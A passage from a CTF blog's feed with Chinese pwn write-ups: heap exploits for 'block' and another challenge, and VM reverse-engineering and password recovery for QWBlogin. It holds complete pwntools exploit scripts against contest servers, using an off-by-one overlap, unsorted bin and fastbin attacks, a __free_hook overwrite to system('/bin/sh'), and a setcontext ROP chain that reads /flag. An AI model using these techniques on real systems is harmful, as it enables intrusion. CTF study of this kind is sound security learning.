__free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">-1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">15</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="block"><a href="#block" class="headerlink" title="block"></a>block</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li><p>这个<code>2333</code>号功能貌似是迷惑性质的？这个随机数没法拿到，直接放弃这个功能了；另外那个<code>gas</code>基本上不可能超过，足够用了，所以可以不用管。</p></li><li><p>binary存在一次<code>add</code>给size或了一个1，所以提供了off by one的机会。</p></li><li><p>但是<code>edit</code>功能和<code>show</code>功能只能使用一次，所以这里先通过off by one（一次<code>edit</code>）构造chunk overlap，伪造unsorted bin把两个fastbin给overlap（从低到高地址分别为inuse和free的状态）。</p></li><li><p>然后从分配空间切割unsorted bin使其和第一个fastbin重合（并且size被覆盖为切割剩下的chunk的size，也就是比原先的fastbin大0x10大小）。</p></li><li><p>此时在释放一个chunk到unsorted bin中，使得unsorted bin中存在两个chunk，再通过inuse的fastbin来leak出libc和heap（一次<code>show</code>）。</p></li><li><p>释放这个inuse的fastbin，然后重新<code>malloc</code>拿到，同时修改<code>unsorted bin-&gt;bk</code>为<code>__free_hook - 0x20</code>以及下一个free的<code>fastbin-&gt;fd = __free_hook - 0x13</code>（保持<code>unsorted bin-&gt;fd</code>和<code>fastbin-&gt;size</code>不变）。</p></li><li><p>然后分配切割剩下的unsorted bin（大小一致，否则会crash），触发unsorted bin attack在<code>__free_hook - 0x10</code>的位置留下libc的地址，再利用这个libc地址的<code>0x7f</code>为size进行fastbin attack得到<code>__free_hook</code>。</p></li><li><p>因为此时unsorted bin被破坏了，fastbin里是空的，所以不能再分配空间，只能在已有chunk的基础上构造rop进行orw（<code>execve</code>被ban了），即在chunk间利用<code>pop rsp</code>进行横跳（chunk正好够用，运气很好）；布置好rop同时改<code>__free_hook</code>为<code>setcontext + 53</code>，之后触发rop即可。</p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'122.112.204.227'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(types, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's type: "</span>, str(types))</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"The Block's content: "</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"The content is "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"The Block's new content: "</span>, content)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">setcontext_offset = libc.sym[<span class="string">'setcontext'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x500</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"AAAA\n"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB\n"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>) <span class="comment"># chunk 4</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x68</span> + <span class="string">'\x81'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB\n"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xdf0</span></span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_setcontext = libc_base + setcontext_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">pop_rsp = libc_base + <span class="number">0x0000000000003960</span> <span class="comment"># pop rsp ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000043a78</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000023e8a</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">pop_pop_pop_ret = libc_base + <span class="number">0x0000000000023e85</span> <span class="comment"># pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d29d5</span><span class="comment"># syscall; ret; </span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># fastbin</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># fastbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, p64(libc_base + <span class="number">0x637d10</span>) + p64(__free_hook - <span class="number">0x20</span>) + <span class="string">'\n'</span>) <span class="comment"># chunk0</span></span><br><span class="line"></span><br><span class="line">payload = flat([pop_rax, <span class="number">2</span>, pop_rdi, __free_hook + <span class="number">0x50</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0x0</span>, syscall])</span><br><span class="line">payload += flat([pop_rax, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsp, heap_base + <span class="number">0x18F0</span>]) <span class="comment"># change rsp</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, payload.ljust(<span class="number">0x68</span>, <span class="string">"B"</span>) + p64(<span class="number">0x71</span>) + p64(__free_hook - <span class="number">0x13</span>)) <span class="comment"># unsorted bin attack (chunk 3 ==&gt; to be freed)</span></span><br><span class="line"></span><br><span class="line">payload = flat([pop_rdi, <span class="number">3</span>, pop_rsi, heap_base, pop_pop_pop_ret]) + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += flat([heap_base + <span class="number">0x1880</span>, ret])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([syscall])</span><br><span class="line">payload += flat([pop_rsp, __free_hook + <span class="number">0x8</span>])</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([pop_rax, <span class="number">1</span>, pop_rdi, <span class="number">1</span>, pop_rsi, heap_base, pop_rdx, <span class="number">0x40</span>, syscall])</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x3</span> + p64(libc_setcontext + <span class="number">53</span>) + payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目不是我做的，但是简单看了下，比较简单，就是个fastbin double free，以及无leak的情况下打stdout进行leak的利用方式。</p><h2 id="fsplayground"><a href="#fsplayground" class="headerlink" title="fsplayground"></a>fsplayground</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>这题是公司的学长做的，不过我也一下没反应过来怎么做，因为就是一个任意读写文件的功能，开始只想到了读<code>/proc/self/maps</code>可以读加载地址；后来学长说可以通过写<code>/proc/self/memory</code>直接改加载在内存里的binary，然后直接把<code>flag</code>那个字符串给改了，然后check的逻辑就废了，就能直接读flag了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实习的倒数第二天在公司打的最后一场比赛了，贡献一点小小的力量，最后进前十了还是很开心的。但是只搞了两个pwn，剩下的babyrpc没有仔细看，vmpwn卡住了，就暂且写一下剩下部分的wp吧，其他的看看后面能不能搜到wp。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>强网杯线上赛部分pwn</title>
    <link href="https://n0nop.com/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/"/>
    <id>https://n0nop.com/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/</id>
    <published>2020-08-26T06:26:49.000Z</published>
    <updated>2021-04-24T02:54:26.669Z</updated>
    
    <content type="html"><![CDATA[<p>pwn比赛，但是太弱了只能做简单的题，难题只能赛后学习别人的wp了；最后跟着队里打进了前十，大哥们太猛了！就简单记录一下自己做得题好了，本来是想着复现一些题的，但是时间上目前比较吃紧，以后有时间再看吧（咕咕咕）。</p><a id="more"></a><h1 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h1><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>vm pwn，分析一下binary：</p><p> 初始化的过程如下：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">v9 = (struc_pcb *)<span class="built_in">calloc</span>(<span class="number">0xD0</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  v9-&gt;code_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 6   ===&gt;    code data start</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;code_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">6</span>)], *(_QWORD *)(v8 + <span class="number">14</span>));<span class="comment">// v8 + 14   ===&gt;   code length</span></span><br><span class="line">  v9-&gt;code_size = ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store code data size</span></span><br><span class="line">  v9-&gt;global_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 30   ===&gt;   global data size</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;global_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">22</span>)], *(_QWORD *)(v8 + <span class="number">30</span>));<span class="comment">// v8 + 22   ===&gt;    global data start</span></span><br><span class="line">  v9-&gt;global_size = ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store global data size</span></span><br><span class="line">  v9-&gt;stack_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x20000</span>uLL);     <span class="comment">// stack</span></span><br><span class="line">  v9-&gt;stack_size = <span class="number">0x20000</span>LL;</span><br><span class="line">  v9-&gt;_rsp = <span class="number">0x10000</span>LL;</span><br><span class="line">  v9-&gt;_rip = *(_QWORD *)(v8 + <span class="number">38</span>);              <span class="comment">// v8 + 38   ===&gt;   pc start</span></span><br><span class="line">  IO_FILE = (__int64)<span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)IO_FILE = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v3 = IO_FILE;</span><br><span class="line">  *(_QWORD *)(v3 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(IO_FILE + <span class="number">16</span>) = <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *(_QWORD *)(IO_FILE + <span class="number">16</span>);</span><br><span class="line">  *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">2</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)vmstart(v9) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p> 传入的<code>v9</code>为自定义的结构体，为了方便分析：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> struc_pcb       struc ; (<span class="keyword">sizeof</span>=<span class="number">0xD8</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span> REG             dq <span class="number">16</span> dup(?)</span><br><span class="line"><span class="number">00000080</span> _rsp            dq ?</span><br><span class="line"><span class="number">00000088</span> field_88        dq ?</span><br><span class="line"><span class="number">00000090</span> _rip            dq ?</span><br><span class="line"><span class="number">00000098</span> rflag           dq ?</span><br><span class="line"><span class="number">000000</span>A0 code_size       dq ?</span><br><span class="line"><span class="number">000000</span>A8 code_buf        dq ?                    ; offset</span><br><span class="line"><span class="number">000000B</span>0 global_size     dq ?</span><br><span class="line"><span class="number">000000B</span>8 global_buf      dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>C0 stack_size      dq ?</span><br><span class="line"><span class="number">000000</span>C8 stack_buf       dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>D0 field_D0        dq ?</span><br><span class="line"><span class="number">000000</span>D8 struc_pcb       ends</span><br></pre></td></tr></table></figure><p> 基本上<code>test.bin</code>里面，<code>0x100 - 0x8B8</code>的位置就是<code>code segment</code>，<code>0x8B8 - 0x978</code>就是<code>bss segment</code>，栈是通过<code>calloc(1uLL, 0x20000uLL)</code>另外开辟的，栈底就是<code>0x20000</code>。</p><p> 指令部分简单贴一下当时做题的分析结果（有些指令逻辑是相同的，但是不影响）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[0]  [1]  [2]  [3]</span><br><span class="line">0000 0000 0000 0000</span><br><span class="line">[3] &#x3D;&#x3D;&gt; opcode            ins_len </span><br><span class="line">        0x1, 2, 3, 4      0xB</span><br><span class="line">        0x0, B, C, D, E   0x4</span><br><span class="line">        0x5               [2] &#x3D;&#x3D; 0x1: 0x4</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x2: 0x5</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x3: 0x7</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x4: 0xB</span><br><span class="line">        0x6               0x3</span><br><span class="line">        0x7               [2] &#x3D;&#x3D; 0x1: 0x3</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x2: 0x4</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x3: 0x6</span><br><span class="line">                          [2] &#x3D;&#x3D; 0x4: 0xA</span><br><span class="line">        0x8               [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">                                else: 0xA</span><br><span class="line">        0x9               [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">                     _rip &gt;&#x3D; size-10: 0x2</span><br><span class="line">    </span><br><span class="line"> rflag:</span><br><span class="line"> 8  &lt; (unsigned)</span><br><span class="line"> 1  overflow</span><br><span class="line"> 4  zero</span><br><span class="line"> 2  res is negative (signed)</span><br><span class="line"> </span><br><span class="line"> 1：mov指令</span><br><span class="line"> 2：add</span><br><span class="line"> 3：sub</span><br><span class="line"> 4：mul</span><br><span class="line"> 5：mul</span><br><span class="line"> 6：mod</span><br><span class="line"> 7：xor</span><br><span class="line"> 8：or</span><br><span class="line"> 9：and</span><br><span class="line"> A：shl</span><br><span class="line"> B：shr</span><br><span class="line"> C：not</span><br><span class="line"> D：pop</span><br><span class="line"> E：push</span><br><span class="line"> 10：call</span><br><span class="line"> 11：ret</span><br><span class="line"> 12：cmp</span><br><span class="line"> 13：jmp</span><br><span class="line"> 14：jz</span><br><span class="line"> 15：jnz</span><br><span class="line"> 16：jg</span><br><span class="line"> 17：jg</span><br><span class="line"> 18：jle</span><br><span class="line"> 19：jge</span><br><span class="line"> 1A：ja</span><br><span class="line"> 1B：ja</span><br><span class="line"> 1C：jae</span><br><span class="line"> 1D：jae</span><br><span class="line"> 0x20：syscall</span><br><span class="line"> </span><br><span class="line"> for 0x20:</span><br><span class="line"> 20 xx  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 3,  args: r1              close</span><br><span class="line"> 20 08  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual bss</span><br><span class="line">              r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual bss</span><br><span class="line"> 20 09  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual stack</span><br><span class="line">              r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual stack</span><br><span class="line"> 20 10  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 0,  args: r1, r2          open</span><br></pre></td></tr></table></figure></li><li><p>由于本身是个pwn题，如果用我的龟速去写个脚本翻译指令就太慢了，索性就直接颅内翻译+动态调试验证，其实逻辑也十分简单。</p></li><li><p>首先<code>test.bin</code>是通过<code>call</code>指令进入主函数，然后要求输入<code>password</code>然后进行<code>check</code>前<code>3</code>个字符是单独比较的，后面<code>32</code>个字符分成四组异或后再比较，基本遵从如下格式（<code>test.bin</code>里<code>0x22E</code>的位置）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01 15 00 01   &#x3D;&#x3D;&#x3D;&gt;   movb r0, 1</span><br><span class="line">01 25 01 00 00    &#x3D;&#x3D;&#x3D;&gt;   movw r1, 1</span><br><span class="line">01 25 02 40 00    &#x3D;&#x3D;&#x3D;&gt;   movw r2, 0x40</span><br><span class="line">01 15 03 21   &#x3D;&#x3D;&#x3D;&gt;   movb r3, 0x21</span><br><span class="line">20 08    &#x3D;&#x3D;&#x3D;&gt;   read</span><br><span class="line">07 40 08 08    &#x3D;&#x3D;&#x3D;&gt;   xor r8, r8  </span><br><span class="line">01 41 08 40 00 00 00 00 00 00 00    &#x3D;&#x3D;&#x3D;&gt;   movq r8, 0x40</span><br><span class="line">01 45 09 CD AB 27 98 12 34 72 42    &#x3D;&#x3D;&#x3D;&gt;   movq r9, 0x427234129827ABCD</span><br><span class="line">07 40 08 09   &#x3D;&#x3D;&#x3D;&gt;   xor r8, r9</span><br><span class="line">12 45 08 8A 9B 17 DC 40 07 24 10    &#x3D;&#x3D;&#x3D;&gt;   cmp r8, 0x10240740DC179B8A</span><br><span class="line">14 17 02   &#x3D;&#x3D;&#x3D;&gt;   jz 2</span><br><span class="line">00 0A   &#x3D;&#x3D;&#x3D;&gt;   exit</span><br></pre></td></tr></table></figure><p> 那么简单写个逆推脚本：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">"QWQ"</span></span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xCD</span>, <span class="number">0xAB</span>, <span class="number">0x27</span>, <span class="number">0x98</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x42</span>]</span><br><span class="line">a2 = [<span class="number">0x8A</span>, <span class="number">0x9B</span>, <span class="number">0x17</span>, <span class="number">0xDC</span>, <span 